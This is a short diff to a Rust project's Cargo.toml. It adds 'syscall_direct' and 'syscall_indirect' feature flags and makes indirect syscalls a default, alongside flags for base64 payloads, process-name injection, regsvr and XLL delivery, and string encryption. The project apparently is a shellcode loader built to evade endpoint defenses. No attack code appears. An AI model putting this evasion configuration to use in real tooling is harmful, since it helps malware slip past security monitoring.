@@ -20,10 +20,13 @@ litcrypt = "0.3.0"
 rand = "0.8.5"
 
 [features]
-default = ["payload_b64", "inject_proc_name"]
+default = ["payload_b64", "inject_proc_name", "syscall_indirect"]
 no_console = []
 regsvr = []
 xll = []
+#syscall types
+syscall_direct = []
+syscall_indirect = []
 #payload type
 payload_b64 = []
 #injection target
